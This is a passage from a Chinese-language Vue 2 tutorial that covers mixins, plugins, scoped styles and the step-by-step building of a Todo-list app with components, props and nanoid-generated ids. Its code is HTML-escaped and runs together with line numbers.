//默认值，与required配置项不兼容 &#125;&#125; 注意：props是只读的，Vue底层会监测你对props的修改，如果进行修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据。 3.7 mixin混入两个组件有相同的需求：点击button，提示名称 Student.vue 1234567891011121314151617181920212223242526272829303132333435&lt;template&gt; &lt;div&gt; &lt;h2 class&#x3D;&quot;name&quot;&gt;姓名:&#123;&#123; name &#125;&#125;&lt;&#x2F;h2&gt; &lt;h2 class&#x3D;&quot;age&quot;&gt;年龄:&#123;&#123; age &#125;&#125;&lt;&#x2F;h2&gt; &lt;button @click&#x3D;&quot;showName&quot;&gt;点击按钮提示名称&lt;&#x2F;button&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;&#x2F;&#x2F; 引入混合import &#123; mixin &#125; from &quot;..&#x2F;mixin&quot;;export default &#123; name: &quot;School&quot;, data() &#123; return &#123; age: 20, name: &quot;张加林&quot;, &#125;; &#125;, mixins:[mixin]&#125;;&lt;&#x2F;script&gt;&lt;style&gt;.age &#123; color: #8080ff;&#125;.name &#123; color: #2030ff; background-color: #999;&#125;&lt;&#x2F;style&gt; School.vue 1234567891011121314151617181920212223242526272829&lt;template&gt; &lt;div class&#x3D;&quot;school&quot;&gt; &lt;h2&gt;学校名称：&#123;&#123; name &#125;&#125;&lt;&#x2F;h2&gt; &lt;h2&gt;学校地址：&#123;&#123; address &#125;&#125;&lt;&#x2F;h2&gt; &lt;button @click&#x3D;&quot;showName&quot;&gt;点击按钮提示名称&lt;&#x2F;button&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;&#x2F;&#x2F; 引入混合import &#123; mixin &#125; from &quot;..&#x2F;mixin&quot;;export default &#123; name: &quot;Student&quot;, data() &#123; return &#123; name: &quot;UESTC&quot;, address: &quot;成华区建设路&quot;, &#125;; &#125;, mixins: [mixin],&#125;;&lt;&#x2F;script&gt;&lt;style&gt;.school &#123; color: #99ff00;&#125;&lt;&#x2F;style&gt; mixin.js 12345678export const mixin = &#123; methods: &#123; showName() &#123; alert(this.name); &#125;, &#125;,&#125;; 混合就是复用配置。 mixin.js 12345678export const mixin2 = &#123; data() &#123; return &#123; x: 400, y: 100, &#125;; &#125;,&#125;; 混入中的data与组件中的data会进行整合，二者之间如果出现相同的配置名称，即出现冲突，以组件的原始data配置为准。（原则：mixin中有的数据，组件data中没有的，就将mixin.js中的加入；如果组件data中有的，就以组件中的为准） 易错点： 对于生命周期钩子，不以二者中的任何一个为主，都会被执行。，而且是mixin.js中的钩子先于组件中的钩子执行。 上述所有的混入都是局部混入，下面介绍全局混合： 整个应用中，所有的vc / vm都会得到混入配置，下面验证： 总结mixin混入 功能：可以把多个组件共用的配置提取成一个混入对象 使用方式： 第一步定义混入，例如： 12345export const mixin&#123; data()&#123;……&#125;, methods:&#123;……&#125; ……&#125; 第二步使用混入，例如： 全局混入： 1Vue.mixin(xxxx) 局部混入 1mixins:[&#x27;xxx&#x27;,&#x27;xxx&#x27;,……] 3.8 插件plugins.js 12345export default &#123; install(a) &#123; console.log(&quot;@@@install&quot;, a); &#125;,&#125;; a为vm的缔造者——Vue的构造函数 main.js 12345678910111213141516// 引入Vueimport Vue from &quot;vue&quot;;// 引入Appimport App from &quot;./App.vue&quot;;// 引入插件import plugins from &quot;./plugins&quot;;// 关闭生产提示Vue.config.productionTip = false;// 应用插件Vue.use(plugins);// 创建vmnew Vue(&#123; components: &#123; App &#125;, render: (h) =&gt; h(App),&#125;).$mount(&quot;#app&quot;); 下面进行插件的使用： plugin.js 12345678910111213141516171819202122232425262728293031323334353637export default &#123; install(Vue) &#123; // 配置全局过滤器 Vue.filter(&quot;myslice&quot;, function(value) &#123; return value.slice(0, 4); &#125;); // 定义全局指令 Vue.directive(&quot;fbind&quot;, &#123; bind(element, binding) &#123; element.value = binding.value; &#125;, inserted(element) &#123; element.focus(); &#125;, update(element, binding) &#123; element.value = binding.value; &#125;, &#125;); // 定义混入 Vue.mixin(&#123; data() &#123; return &#123; x: 100, y: 99,&#125;; &#125;, &#125;); // 给Vue原型上添加一个方法（vm和vc都能使用） Vue.prototype.hello = () =&gt; &#123; alert(&quot;你好啊,zhul&quot;); &#125;; &#125;,&#125;; main.js：略 School.vue 12345678910111213141516171819202122232425262728293031&lt;template&gt; &lt;div class&#x3D;&quot;school&quot;&gt; &lt;h2&gt;学校名称：&#123;&#123; name | myslice &#125;&#125;&lt;&#x2F;h2&gt; &lt;h2&gt;学校地址：&#123;&#123; address &#125;&#125;&lt;&#x2F;h2&gt; &lt;button @click&#x3D;&quot;test&quot;&gt;点我测试插件中的hello&lt;&#x2F;button&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;export default &#123; name: &quot;Student&quot;, data() &#123; return &#123; name: &quot;UESTC&quot;, address: &quot;成华区建设路&quot;, &#125;; &#125;, methods: &#123; test() &#123; console.log(this); this.hello(); &#125;, &#125;,&#125;;&lt;&#x2F;script&gt;&lt;style&gt;.school &#123; color: #99ff00;&#125;&lt;&#x2F;style&gt; Student.vue 12345678910111213141516171819202122232425262728293031&lt;template&gt; &lt;div&gt; &lt;h2 class&#x3D;&quot;name&quot;&gt;姓名:&#123;&#123; name &#125;&#125;&lt;&#x2F;h2&gt; &lt;h2 class&#x3D;&quot;age&quot;&gt;年龄:&#123;&#123; age &#125;&#125;&lt;&#x2F;h2&gt; &lt;input type&#x3D;&quot;text&quot; v-fbind:value&#x3D;&quot;name&quot; &#x2F;&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;export default &#123; name: &quot;School&quot;, data() &#123; return &#123; age: 20, name: &quot;张加林&quot;, &#125;; &#125;,&#125;;&lt;&#x2F;script&gt;&lt;style&gt;.age &#123; color: #8080ff;&#125;.name &#123; color: #2030ff; background-color: #999;&#125;&lt;&#x2F;style&gt; 总结插件功能：用于增强Vue 本质：包含install方法的一个对象，install第一个参数是Vue，第二个以后的参数是插件使用者传递的参数数据。 定义插件： 1234567891011对象.install = function(Vue, option)&#123; // 添加全局过滤器 // 添加全局指令 // 配置全局混入 // 添加实例对象 Vue.prototype.$myMethod = function()&#123;……&#125; Vue.prototype.$myProperty = xxx&#125; 使用插件： 1Vue.use(xxx) 3.9 scoped样式用于避免组件类名冲突。 例子： Student.vue 12345678910111213141516171819202122232425&lt;template&gt; &lt;div class&#x3D;&quot;demo&quot;&gt; &lt;h2&gt;姓名:&#123;&#123; name &#125;&#125;&lt;&#x2F;h2&gt; &lt;h2&gt;年龄:&#123;&#123; age &#125;&#125;&lt;&#x2F;h2&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;export default &#123; name: &quot;School&quot;, data() &#123; return &#123; age: 20, name: &quot;张加林&quot;, &#125;; &#125;,&#125;;&lt;&#x2F;script&gt;&lt;style&gt;.demo &#123; color: #8080ff;&#125;&lt;&#x2F;style&gt; School.vue 123456789101112131415161718192021222324&lt;template&gt; &lt;div class&#x3D;&quot;demo&quot;&gt; &lt;h2&gt;学校名称：&#123;&#123; name | myslice &#125;&#125;&lt;&#x2F;h2&gt; &lt;h2&gt;学校地址：&#123;&#123; address &#125;&#125;&lt;&#x2F;h2&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;export default &#123; name: &quot;Student&quot;, data() &#123; return &#123; name: &quot;UESTC&quot;, address: &quot;成华区建设路&quot;, &#125;; &#125;,&#125;;&lt;&#x2F;script&gt;&lt;style&gt;.demo &#123; color: #99ff00;&#125;&lt;&#x2F;style&gt; App.vue 123456789101112131415161718192021&lt;template&gt; &lt;div&gt; &lt;Student &#x2F;&gt; &lt;hr &#x2F;&gt; &lt;School &#x2F;&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;&#x2F;&#x2F; 引入组件import Student from &quot;.&#x2F;components&#x2F;Student&quot;;import School from &quot;.&#x2F;components&#x2F;School&quot;;export default &#123; name: &quot;App&quot;, components: &#123; Student, School &#125;,&#125;;&lt;&#x2F;script&gt;&lt;style&gt;&lt;&#x2F;style&gt; 最终School中的demo样式生效，因为它最后被引入，覆盖了前面的样式，在style标签上添加scoped属性即可。 作用原理：给最外侧的标签添加一个标签属性，后面的值是随机生成的，再配合标签属性选择器，就完后了控制指定的标签。 同时，在App.vue上的style标签上添加scoped可以防止样式被传递到所有的组件中去。 12&lt;style lang=&quot;css&quot;&gt;&lt;/style&gt; lang代表CSS的书写语言，例如：css / less 但是lang = &quot;less&quot;会报错 可能会报错，因为webpack已经到第五版本了，但是Vue官方的脚手架在使用webpack时，使用的不是第五版本： less-loader直接安装就是最新版本，最新版本完全是为了迎合webpack5，而在低版本的webapck中安装最新版本的webpack，显然不太合适。 123npm view webpack versions //查看webpack所有版本npm view less-loader versions // 查看less-loader版本 安装less-loader就可以正常使用less，不写lang属性默认为css 总结scoped样式：让样式在局部生效，防止冲突。 写法： 1&lt;style scoped&gt;&lt;/style&gt; 3.10 Todo-list 案例3.10.1 静态 拆组件的注意事项： 先拆结构后拆样式，先把所有的结构放入App，再逐个细化，细化后要及时将原来的标签用组件标签代替；拆样式，注意加scoped，防止作用域混乱 不要使用Header/Head/Foot/Footer等html标签作为组件名称！ 拆分没有绝对标准，功能实现即可 需要拆分的index.html 12345678910111213141516171819202122232425262728293031323334353637&lt;body&gt; &lt;div id=&quot;root&quot;&gt; &lt;div class=&quot;todo-container&quot;&gt; &lt;div class=&quot;todo-wrap&quot;&gt; &lt;div class=&quot;todo-header&quot;&gt; &lt;input type=&quot;text&quot; placeholder=&quot;请输入你的任务名称，按回车键确认&quot; /&gt; &lt;/div&gt; &lt;ul class=&quot;todo-main&quot;&gt; &lt;li&gt; &lt;label&gt; &lt;input type=&quot;checkbox&quot; /&gt; &lt;span&gt;xxxxx&lt;/span&gt; &lt;/label&gt; &lt;button class=&quot;btn btn-danger&quot; style=&quot;display:none&quot;&gt;删除&lt;/button&gt; &lt;/li&gt; &lt;li&gt; &lt;label&gt; &lt;input type=&quot;checkbox&quot; /&gt; &lt;span&gt;yyyy&lt;/span&gt; &lt;/label&gt; &lt;button class=&quot;btn btn-danger&quot; style=&quot;display:none&quot;&gt;删除&lt;/button&gt; &lt;/li&gt; &lt;/ul&gt; &lt;div class=&quot;todo-footer&quot;&gt; &lt;label&gt; &lt;input type=&quot;checkbox&quot; /&gt; &lt;/label&gt; &lt;span&gt; &lt;span&gt;已完成0&lt;/span&gt; / 全部2 &lt;/span&gt; &lt;button class=&quot;btn btn-danger&quot;&gt;清除已完成任务&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 需要拆分的css 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135/*base*/body &#123; background: #fff;&#125;.btn &#123; display: inline-block; padding: 4px 12px; margin-bottom: 0; font-size: 14px; line-height: 20px; text-align: center; vertical-align: middle; cursor: pointer; box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05); border-radius: 4px;&#125;.btn-danger &#123; color: #fff; background-color: #da4f49; border: 1px solid #bd362f;&#125;.btn-danger:hover &#123; color: #fff; background-color: #bd362f;&#125;.btn:focus &#123; outline: none;&#125;.todo-container &#123; width: 600px; margin: 0 auto;&#125;.todo-container .todo-wrap &#123; padding: 10px; border: 1px solid #ddd; border-radius: 5px;&#125;/*header*/.todo-header input &#123; width: 560px; height: 28px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px; padding: 4px 7px;&#125;.todo-header input:focus &#123; outline: none; border-color: rgba(82, 168, 236, 0.8); box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(82, 168, 236, 0.6);&#125;/*main*/.todo-main &#123; margin-left: 0px; border: 1px solid #ddd; border-radius: 2px; padding: 0px;&#125;.todo-empty &#123; height: 40px; line-height: 40px; border: 1px solid #ddd; border-radius: 2px; padding-left: 5px; margin-top: 10px;&#125;/*item*/li &#123; list-style: none; height: 36px; line-height: 36px; padding: 0 5px; border-bottom: 1px solid #ddd;&#125;li label &#123; float: left; cursor: pointer;&#125;li label li input &#123; vertical-align: middle; margin-right: 6px; position: relative; top: -1px;&#125;li button &#123; float: right; display: none; margin-top: 3px;&#125;li:before &#123; content: initial;&#125;li:last-child &#123; border-bottom: none;&#125;/*footer*/.todo-footer &#123; height: 40px; line-height: 40px; padding-left: 6px; margin-top: 5px;&#125;.todo-footer label &#123; display: inline-block; margin-right: 20px; cursor: pointer;&#125;.todo-footer label input &#123; position: relative; top: -1px; vertical-align: middle; margin-right: 5px;&#125;.todo-footer button &#123; float: right; margin-top: 5px;&#125; 拆分好的组件： App.vue 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;template&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;div class&#x3D;&quot;todo-container&quot;&gt; &lt;div class&#x3D;&quot;todo-wrap&quot;&gt; &lt;TodoHeader&gt;&lt;&#x2F;TodoHeader&gt; &lt;TodoList&gt;&lt;&#x2F;TodoList&gt; &lt;TodoFooter&gt;&lt;&#x2F;TodoFooter&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;import TodoFooter from &quot;.&#x2F;components&#x2F;TodoFooter.vue&quot;;import TodoHeader from &quot;.&#x2F;components&#x2F;TodoHeader.vue&quot;;import TodoList from &quot;.&#x2F;components&#x2F;TodoList.vue&quot;;export default &#123; name: &quot;App&quot;, components: &#123; TodoFooter, TodoHeader, TodoList &#125;,&#125;;&lt;&#x2F;script&gt;&lt;style scoped&gt;&#x2F;*base*&#x2F;body &#123; background: #8080ff;&#125;.btn &#123; display: inline-block; padding: 4px 12px; margin-bottom: 0; font-size: 14px; line-height: 20px; text-align: center; vertical-align: middle; cursor: pointer; box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05); border-radius: 4px;&#125;.btn-danger &#123; color: #fff; background-color: #da4f49; border: 1px solid #bd362f;&#125;.btn-danger:hover &#123; color: #fff; background-color: #bd362f;&#125;.btn:focus &#123; outline: none;&#125;.todo-container &#123; width: 600px; margin: 0 auto;&#125;.todo-container .todo-wrap &#123; padding: 10px; border: 1px solid #ddd; border-radius: 5px;&#125;&lt;&#x2F;style&gt; TodoItem.vue 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;template&gt; &lt;li&gt; &lt;label&gt; &lt;input type&#x3D;&quot;checkbox&quot; &#x2F;&gt; &lt;span&gt;yyyy&lt;&#x2F;span&gt; &lt;&#x2F;label&gt; &lt;button class&#x3D;&quot;btn btn-danger&quot; style&#x3D;&quot;display: none&quot;&gt;删除&lt;&#x2F;button&gt; &lt;&#x2F;li&gt;&lt;&#x2F;template&gt;&lt;script&gt;export default &#123; name: &quot;TodoItem&quot;,&#125;;&lt;&#x2F;script&gt;&lt;style scoped&gt;&#x2F;*item*&#x2F;li &#123; list-style: none; height: 36px; line-height: 36px; padding: 0 5px; border-bottom: 1px solid #ddd;&#125;li label &#123; float: left; cursor: pointer;&#125;li label li input &#123; vertical-align: middle; margin-right: 6px; position: relative; top: -1px;&#125;li button &#123; float: right; display: none; margin-top: 3px;&#125;li:before &#123; content: initial;&#125;li:last-child &#123; border-bottom: none;&#125;&lt;&#x2F;style&gt; TodoHeader.vue 123456789101112131415161718192021222324252627282930&lt;template&gt; &lt;div class&#x3D;&quot;todo-header&quot;&gt; &lt;input type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;请输入你的任务名称，按回车键确认&quot; &#x2F;&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;export default &#123; name: &quot;TodoHeader&quot;,&#125;;&lt;&#x2F;script&gt;&lt;style scoped&gt;&#x2F;*header*&#x2F;.todo-header input &#123; width: 560px; height: 28px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px; padding: 4px 7px;&#125;.todo-header input:focus &#123; outline: none; border-color: rgba(82, 168, 236, 0.8); box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(82, 168, 236, 0.6);&#125;&lt;&#x2F;style&gt; TodoFooter.vue 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;template&gt; &lt;div class&#x3D;&quot;todo-footer&quot;&gt; &lt;label&gt; &lt;input type&#x3D;&quot;checkbox&quot; &#x2F;&gt; &lt;&#x2F;label&gt; &lt;span&gt; &lt;span&gt;已完成0&lt;&#x2F;span&gt; &#x2F; 全部2 &lt;&#x2F;span&gt; &lt;button class&#x3D;&quot;btn btn-danger&quot;&gt;清除已完成任务&lt;&#x2F;button&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;export default &#123; name: &quot;TodoFooter&quot;,&#125;;&lt;&#x2F;script&gt;&lt;style scoped&gt;&#x2F;*footer*&#x2F;.todo-footer &#123; height: 40px; line-height: 40px; padding-left: 6px; margin-top: 5px;&#125;.todo-footer label &#123; display: inline-block; margin-right: 20px; cursor: pointer;&#125;.todo-footer label input &#123; position: relative; top: -1px; vertical-align: middle; margin-right: 5px;&#125;.todo-footer button &#123; float: right; margin-top: 5px;&#125;&lt;&#x2F;style&gt; TodoList.vue 123456789101112131415161718192021222324252627282930313233343536&lt;template&gt; &lt;ul class&#x3D;&quot;todo-main&quot;&gt; &lt;TodoItem&gt;&lt;&#x2F;TodoItem&gt; &lt;TodoItem&gt;&lt;&#x2F;TodoItem&gt; &lt;TodoItem&gt;&lt;&#x2F;TodoItem&gt; &lt;TodoItem&gt;&lt;&#x2F;TodoItem&gt; &lt;&#x2F;ul&gt;&lt;&#x2F;template&gt;&lt;script&gt;import TodoItem from &quot;.&#x2F;TodoItem.vue&quot;;export default &#123; name: &quot;TodoList&quot;, components: &#123; TodoItem &#125;,&#125;;&lt;&#x2F;script&gt;&lt;style scoped&gt;&#x2F;*main*&#x2F;.todo-main &#123; margin-left: 0px; border: 1px solid #ddd; border-radius: 2px; padding: 0px;&#125;.todo-empty &#123; height: 40px; line-height: 40px; border: 1px solid #ddd; border-radius: 2px; padding-left: 5px; margin-top: 10px;&#125;&lt;&#x2F;style&gt; 3.10.2 初始化列表注意：由于后续不需要分析style，我们省略后续所有的style标签 如何动态的决定一个标签属性的有无？ 使用v-bind:即可 修改后的TodoItem.vue 12345678910111213141516&lt;template&gt; &lt;li&gt; &lt;label&gt; &lt;input type&#x3D;&quot;checkbox&quot; :checked&#x3D;&quot;todo.done&quot; &#x2F;&gt; &lt;span&gt;&#123;&#123; todo.title &#125;&#125;&lt;&#x2F;span&gt; &lt;&#x2F;label&gt; &lt;button class&#x3D;&quot;btn btn-danger&quot; style&#x3D;&quot;display: none&quot;&gt;删除&lt;&#x2F;button&gt; &lt;&#x2F;li&gt;&lt;&#x2F;template&gt;&lt;script&gt;export default &#123; name: &quot;TodoItem&quot;, props: [&quot;todo&quot;],&#125;;&lt;&#x2F;script&gt; 修改后的TodoList.vue 123456789101112131415161718192021222324&lt;template&gt; &lt;ul class&#x3D;&quot;todo-main&quot;&gt; &lt;TodoItem v-for&#x3D;&quot;todoObj in todos&quot; :key&#x3D;&quot;todoObj.id&quot; :todo&#x3D;&quot;todoObj&quot;&gt; &lt;&#x2F;TodoItem&gt; &lt;&#x2F;ul&gt;&lt;&#x2F;template&gt;&lt;script&gt;import TodoItem from &quot;.&#x2F;TodoItem.vue&quot;;export default &#123; name: &quot;TodoList&quot;, components: &#123; TodoItem &#125;, data() &#123; return &#123; todos: [ &#123; id: &quot;001&quot;, title: &quot;吃饭&quot;, done: true &#125;, &#123; id: &quot;002&quot;, title: &quot;睡觉&quot;, done: false &#125;, &#123; id: &quot;003&quot;, title: &quot;打游戏&quot;, done: true &#125;, ], &#125;; &#125;,&#125;;&lt;&#x2F;script&gt; 3.10.3 添加要想随机生成唯一标识id，可以使用： 时间戳（Date.now()） 随机数（Math.random()） 推荐：uuid可以生成全球唯一id，大致原理是根据地理位置、电脑网卡MAC地址、内存条序列号……生成一个唯一的id，有固定的生成包可以使用，但是由于uuid是在过于庞大，所以我们可以使用简洁版——nanoid 安装： 1npm i nanoid 采用分别暴露方式，引入： 1import &#123;nanoid&#125; from &#x27;nanoid&#x27;; 想要将子组件的数据传给父组件，一种最原始的方法：父组件传给子组件一个函数，子组件在合适的时间调用函数，就能传给父组件数据。 注意：data、props、methods、computed中的数据不能重名！！！ App.vue 1234567891011121314151617181920212223242526272829303132333435363738&lt;template&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;div class&#x3D;&quot;todo-container&quot;&gt; &lt;div class&#x3D;&quot;todo-wrap&quot;&gt; &lt;TodoHeader :getAdd&#x3D;&quot;getAdd&quot;&gt;&lt;&#x2F;TodoHeader&gt; &lt;TodoList :todos&#x3D;&quot;todos&quot;&gt;&lt;&#x2F;TodoList&gt; &lt;TodoFooter&gt;&lt;&#x2F;TodoFooter&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;import TodoFooter from &quot;.&#x2F;components&#x2F;TodoFooter.vue&quot;;import TodoHeader from &quot;.&#x2F;components&#x2F;TodoHeader.vue&quot;;import TodoList from &quot;.&#x2F;components&#x2F;TodoList.vue&quot;;export default &#123; name: &quot;App&quot;, components: &#123; TodoFooter, TodoHeader, TodoList &#125;, data() &#123; return &#123; todos: [ &#123; id: &quot;001&quot;, title: &quot;吃饭&quot;, done: true &#125;, &#123; id: &quot;002&quot;, title: &quot;睡觉&quot;, done: false &#125;, &#123; id: &quot;003&quot;, title: &quot;打游戏&quot;, done: true &#125;, ], &#125;; &#125;, methods: &#123; getAdd(Obj) &#123; this.todos.unshift(Obj); &#125;, &#125;,&#125;;&lt;&#x2F;script&gt; TodoList.vue 12345678910111213141516&lt;template&gt; &lt;ul class&#x3D;&quot;todo-main&quot;&gt; &lt;TodoItem v-for&#x3D;&quot;todoObj in todos&quot; :key&#x3D;&quot;todoObj.id&quot; :todo&#x3D;&quot;todoObj&quot;&gt; &lt;&#x2F;TodoItem&gt; &lt;&#x2F;ul&gt;&lt;&#x2F;template&gt;&lt;script&gt;import TodoItem from &quot;.&#x2F;TodoItem.vue&quot;;export default &#123; name: &quot;TodoList&quot;, components: &#123; TodoItem &#125;, props: [&quot;todos&quot;],&#125;;&lt;&#x2F;script&gt; TodoHeader.vue 12345678910111213141516171819202122232425262728&lt;template&gt; &lt;div class&#x3D;&quot;todo-header&quot;&gt; &lt;input type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;请输入你的任务名称，按回车键确认&quot; @keyup.enter&#x3D;&quot;add&quot; &#x2F;&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;import &#123; nanoid &#125; from &quot;nanoid&quot;;export default &#123; name: &quot;TodoHeader&quot;, methods: &#123; add(event) &#123; &#x2F;&#x2F; 数据校验 if (!event.target.value.trim()) return alert(&quot;输入不能为空！&quot;); &#x2F;&#x2F; 将用户的输入包装成为一个todo对象 const todoObj &#x3D; &#123; id: nanoid(), title: event.target.value, done: false &#125;; this.getAdd(todoObj); event.target.value &#x3D; &quot;&quot;; &#125;, &#125;, props: [&quot;getAdd&quot;],&#125;;&lt;&#x2F;script&gt; 3.10.4 勾选绑定change事件 / click事件来实现。 使用父传孙实现App.vue 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;template&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;div class&#x3D;&quot;todo-container&quot;&gt; &lt;div class&#x3D;&quot;todo-wrap&quot;&gt; &lt;TodoHeader :getAdd&#x3D;&quot;getAdd&quot;&gt;&lt;&#x2F;TodoHeader&gt; &lt;TodoList :todos&#x3D;&quot;todos&quot; :checkTodo&#x3D;&quot;checkTodo&quot;&gt;&lt;&#x2F;TodoList&gt; &lt;TodoFooter&gt;&lt;&#x2F;TodoFooter&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;import TodoFooter from &quot;.&#x2F;components&#x2F;TodoFooter.vue&quot;;import TodoHeader from &quot;.&#x2F;components&#x2F;TodoHeader.vue&quot;;import TodoList from &quot;.&#x2F;components&#x2F;TodoList.vue&quot;;export default &#123; name: &quot;App&quot;, components: &#123; TodoFooter, TodoHeader, TodoList &#125;, data() &#123; return &#123; todos: [ &#123; id: &quot;001&quot;, title: &quot;吃饭&quot;, done: true &#125;, &#123; id: &quot;002&quot;, title: &quot;睡觉&quot;, done: false &#125;, &#123; id: &quot;003&quot;, title: &quot;打游戏&quot;, done: true &#125;, ], &#125;; &#125;, methods: &#123; getAdd(Obj) &#123; &#x2F;&#x2F; 添加一个代办 this.todos.unshift(Obj); &#125;, checkTodo(id) &#123; &#x2F;&#x2F; 勾选 &#x2F; 取消勾选一个Todo this.todos.forEach((todo) &#x3D;&gt; &#123; if (todo.id &#x3D;&#x3D;&#x3D; id) todo.done &#x3D; !todo.done; &#125;); &#125;, &#125;,&#125;;&lt;&#x2F;script&gt; Todolist.vue TodoItem.vue 123456789101112131415161718192021&lt;template&gt; &lt;ul class&#x3D;&quot;todo-main&quot;&gt; &lt;TodoItem v-for&#x3D;&quot;todoObj in todos&quot; :key&#x3D;&quot;todoObj.id&quot; :todo&#x3D;&quot;todoObj&quot; :checkTodo&#x3D;&quot;checkTodo&quot; &gt; &lt;&#x2F;TodoItem&gt; &lt;&#x2F;ul&gt;&lt;&#x2F;template&gt;&lt;script&gt;import TodoItem from &quot;.&#x2F;TodoItem.vue&quot;;export default &#123; name: &quot;TodoList&quot;, components: &#123; TodoItem &#125;, props: [&quot;todos&quot;, &quot;checkTodo&quot;],&#125;;&lt;&#x2F;script&gt; v-model实现v-model收集表单数据时提到过：如果表单是checkbox类型，并且使用v-model绑定了一个布尔值，那么这个布尔值就能决定checkbox的勾选！即v-model默认绑定了checked TodoItem.vue 12345678910111213141516&lt;template&gt; &lt;li&gt; &lt;label&gt; &lt;input type&#x3D;&quot;checkbox&quot; v-model&#x3D;&quot;todo.done&quot; &#x2F;&gt; &lt;span&gt;&#123;&#123; todo.title &#125;&#125;&lt;&#x2F;span&gt; &lt;&#x2F;label&gt; &lt;button class&#x3D;&quot;btn btn-danger&quot; style&#x3D;&quot;display: none&quot;&gt;删除&lt;&#x2F;button&gt; &lt;&#x2F;li&gt;&lt;&#x2F;template&gt;&lt;script&gt;export default &#123; name: &quot;TodoItem&quot;, props: [&quot;to&#39;do&quot;]&#125;;&lt;&#x2F;script&gt; 但是不建议这样做，因为修改了传入的props中的数据，违反了原则，不报错是因为Vue无法监测这种修改，情形如： 1234let obj = &#123;a:1,b:2&#125;obj.a = 66 // 感知不到obj = &#123;x:100,y:100&#125; // 可以感知到 3.10.5 删除注意：不要使用delete命名方法，因为它已经被JS中的关键词，用于删除对象中的某一个属性。 浏览器设置控制台输出的内容： App.vue 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;template&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;div class&#x3D;&quot;todo-container&quot;&gt; &lt;div class&#x3D;&quot;todo-wrap&quot;&gt; &lt;TodoHeader :getAdd&#x3D;&quot;getAdd&quot;&gt;&lt;&#x2F;TodoHeader&gt; &lt;TodoList :todos&#x3D;&quot;todos&quot; :checkTodo&#x3D;&quot;checkTodo&quot; :deleteTodo&#x3D;&quot;deleteTodo&quot; &gt;&lt;&#x2F;TodoList&gt; &lt;TodoFooter&gt;&lt;&#x2F;TodoFooter&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;import TodoFooter from &quot;.&#x2F;components&#x2F;TodoFooter.vue&quot;;import TodoHeader from &quot;.&#x2F;components&#x2F;TodoHeader.vue&quot;;import TodoList from &quot;.&#x2F;components&#x2F;TodoList.vue&quot;;export default &#123; name: &quot;App&quot;, components: &#123; TodoFooter, TodoHeader, TodoList &#125;, data() &#123; return &#123; todos: [ &#123; id: &quot;001&quot;, title: &quot;吃饭&quot;, done: true &#125;, &#123; id: &quot;002&quot;, title: &quot;睡觉&quot;, done: false &#125;, &#123; id: &quot;003&quot;, title: &quot;打游戏&quot;, done: true &#125;, ], &#125;; &#125;, methods: &#123; getAdd(Obj) &#123; &#x2F;&#x2F; 添加一个代办 this.todos.unshift(Obj); &#125;, checkTodo(id) &#123; &#x2F;&#x2F; 勾选 &#x2F; 取消勾选一个待办事项 this.todos.forEach((todo) &#x3D;&gt; &#123; if (todo.id &#x3D;&#x3D;&#x3D; id) todo.done &#x3D; !todo.done; &#125;); &#125;, deleteTodo(id) &#123; &#x2F;&#x2F; 删除一个代办事项 this.todos &#x3D; this.todos.filter((todo) &#x3D;&gt; &#123; return todo.id !&#x3D;&#x3D; id; &#125;); &#125;, &#125;,&#125;;&lt;&#x2F;script&gt; TodoList.vue 12345678910111213141516171819202122&lt;template&gt; &lt;ul class&#x3D;&quot;todo-main&quot;&gt; &lt;TodoItem v-for&#x3D;&quot;todoObj in todos&quot; :key&#x3D;&quot;todoObj.id&quot; :todo&#x3D;&quot;todoObj&quot; :checkTodo&#x3D;&quot;checkTodo&quot; :deleteTodo&#x3D;&quot;deleteTodo&quot; &gt; &lt;&#x2F;TodoItem&gt; &lt;&#x2F;ul&gt;&lt;&#x2F;template&gt;&lt;script&gt;import 